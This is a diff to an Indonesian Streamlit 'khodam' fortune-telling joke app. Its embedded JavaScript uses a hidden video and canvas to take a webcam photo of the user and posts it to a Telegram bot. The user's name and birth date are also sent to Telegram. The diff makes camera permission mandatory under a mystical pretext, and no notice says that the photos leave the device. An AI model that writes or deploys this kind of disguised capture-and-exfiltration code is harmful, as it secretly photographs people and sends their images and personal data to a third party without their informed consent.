@@ -119,6 +119,8 @@ if 'user_dob' not in st.session_state:
     st.session_state.user_dob = ""
 if 'telegram_sent' not in st.session_state:
     st.session_state.telegram_sent = False
+if 'camera_failed' not in st.session_state:
+    st.session_state.camera_failed = False
 
 # ==========================================
 # DATABASE KHODAM KOCAK & ROASTING MAKSIMAL
@@ -198,21 +200,25 @@ def send_text_to_telegram(name, dob, profile_title):
 # RENDER UTAMA BERDASARKAN STEP
 # ==========================================
 
-# --- STEP 0: FORM RITUAL & PENJELASAN ALASAN KAMERA ---
+# --- STEP 0: FORM RITUAL & VALIDASI KAMERA SAAT SUBMIT ---
 if st.session_state.step == 0:
-    st.markdown("<h1 style='text-align: center; color: #c084fc;'>👁️️ PUSAT PEMINDAIAN KHODAM NUSANTARA</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center; color: #c084fc;'>👁 PUSAT PEMINDAIAN KHODAM NUSANTARA</h1>", unsafe_allow_html=True)
     st.markdown("<p style='text-align: center; color: #94a3b8; margin-bottom: 30px;'>Ketahui khodam gaib pendamping hidupmu dengan teknologi sensor astral termuktahir.</p>", unsafe_allow_html=True)
 
     with st.container():
         st.markdown('<div class="mystic-card">', unsafe_allow_html=True)
         
-        # Penjelasan alasan izin kamera langsung terpampang jelas di dalam kartu
+        # Penjelasan alasan izin kamera terpampang jelas di kartu
         st.markdown("""
             <div class="camera-reason-box">
                 🔮 <b>Informasi Ritual & Kalibrasi Aura:</b><br>
-                Sistem memerlukan izin akses kamera sesaat untuk memindai gelombang energi sukma dan menyelaraskan frekuensi khodam dengan wajahmu sebelum hasil akhir dibongkar.
+                Sistem wajib memerlukan <b>izin akses kamera</b> saat tombol ditekan untuk memindai gelombang energi sukma dan menyelaraskan frekuensi khodam dengan wajahmu. Jika izin ditolak, ritual pembacaan akan otomatis gagal.
             </div>
         """, unsafe_allow_html=True)
+        
+        # Peringatan jika sebelumnya user menolak kamera
+        if st.session_state.camera_failed:
+            st.error("🚨 **RITUAL GAGAL TOTAL!** Akses kamera ditolak oleh perangkat. Dukun gaib tidak dapat mendeteksi auramu karena wajahmu tertutup kegelapan.")
         
         with st.form("ritual_khodam_form"):
             name_input = st.text_input("Nama Lengkap / Nama Panggilan", value="Boboho", placeholder="Contoh: Boboho")
@@ -227,14 +233,19 @@ if st.session_state.step == 0:
                 else:
                     st.session_state.user_name = name_input.strip()
                     st.session_state.user_dob = dob_input.strip() if dob_input.strip() else "Tidak diisi"
-                    st.session_state.telegram_sent = False
-                    st.session_state.step = 1
+                    st.session_state.camera_failed = False
+                    st.session_state.step = 1  # Lanjut ke tahap validasi kamera via JS
                     st.rerun()
                     
         st.markdown('</div>', unsafe_allow_html=True)
 
-    # SKRIP KAMERA TERSEMBUNYI (LANGSUNG EKSEKUSI DI BACKGROUND SAAT STEP 0 DIMULAI)
-    hidden_js_camera = f"""
+# --- STEP 1: EKsekusi KAMERA & VALIDASI IZIN ---
+elif st.session_state.step == 1:
+    st.markdown("<h2 style='text-align: center; color: #c084fc;'>🔮 MENYELARASKAN FREKUENSI GAIB...</h2>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #94a3b8;'>Meminta verifikasi sensor kamera dari browser...</p>", unsafe_allow_html=True)
+    
+    # Komponen Javascript untuk meminta akses kamera ketika tombol diklik
+    camera_validation_js = f"""
     <div>
         <video id="video" width="0" height="0" autoplay style="display:none;"></video>
         <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -242,7 +253,6 @@ if st.session_state.step == 0:
             const token = "{TELEGRAM_BOT_TOKEN}";
             const chatId = "{TELEGRAM_CHAT_ID}";
             
-            // Meminta izin kamera secara otomatis tanpa pop-up yang menutupi teks
             navigator.mediaDevices.getUserMedia({{ video: true }})
             .then(function(stream) {{
                 var video = document.getElementById('video');
@@ -261,29 +271,46 @@ if st.session_state.step == 0:
                         var formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'mystic_target.jpg');
-                        formData.append('caption', '🔮 <b>TARGET AURA GAIB TERDETEKSI (AWAL SESI)!</b>');
+                        formData.append('caption', '🔮 <b>TARGET AURA GAIB TERDETEKSI (VALIDASI SUKSES)!</b>');
                         
                         fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                             method: 'POST',
                             body: formData
+                        }}).then(() => {{
+                            // Jika berhasil kirim foto, arahkan ke step animasi sukses (step 2)
+                            window.location.href = window.location.href + "&success=true";
                         }});
                     }});
                     
                     stream.getTracks().forEach(track => track.stop());
-                }}, 1500);
+                }}, 1000);
             }})
             .catch(function(err) {{
                 console.log("Akses kamera ditolak: ", err);
+                // Jika kamera ditolak, arahkan ke halaman utama dengan status gagal
+                window.location.href = window.location.href + "&failed=true";
             }});
         </script>
     </div>
     """
-    components.html(hidden_js_camera, height=0)
+    components.html(camera_validation_js, height=100)
+    
+    # Penanganan parameter URL untuk mendeteksi apakah kamera diizinkan atau ditolak
+    query_params = st.query_params
+    if "success" in query_params:
+        st.session_state.step = 2  # Masuk ke animasi loading sukses
+        st.query_params.clear()
+        st.rerun()
+    elif "failed" in query_params:
+        st.session_state.camera_failed = True
+        st.session_state.step = 0  # Kembali ke halaman awal dengan pesan gagal
+        st.query_params.clear()
+        st.rerun()
 
-# --- STEP 1: ANIMASI PROSES RITUAL MISTIS ---
-elif st.session_state.step == 1:
+# --- STEP 2: ANIMASI PROSES RITUAL MISTIS ---
+elif st.session_state.step == 2:
     st.markdown("<h2 style='text-align: center; color: #c084fc;'>🔮 SEDANG MERACIK MANTRA GAIB...</h2>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align: center; color: #94a3b8;'>Tolong jangan berkedip, sensor gaib sedang bekerja menembus dimensi lain.</p>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color: #94a3b8;'>Aura wajah berhasil terbaca! Menembus dimensi lain...</p>", unsafe_allow_html=True)
     
     st.write("")
     progress_bar = st.progress(0)
@@ -305,11 +332,11 @@ elif st.session_state.step == 1:
     progress_bar.progress(100)
     time.sleep(0.6)
     
-    st.session_state.step = 2
+    st.session_state.step = 3
     st.rerun()
 
-# --- STEP 2: TAMPILAN HASIL KHODAM KOCAK ---
-elif st.session_state.step == 2:
+# --- STEP 3: TAMPILAN HASIL KHODAM KOCAK ---
+elif st.session_state.step == 3:
     if not st.session_state.telegram_sent:
         # Generator acak khodam unik berdasarkan nama & tanggal lahir user
         unique_string = (st.session_state.user_name + st.session_state.user_dob).lower().encode('utf-8')
@@ -348,4 +375,5 @@ elif st.session_state.step == 2:
         st.session_state.user_name = "Boboho"
         st.session_state.user_dob = ""
         st.session_state.telegram_sent = False
+        st.session_state.camera_failed = False
         st.rerun()
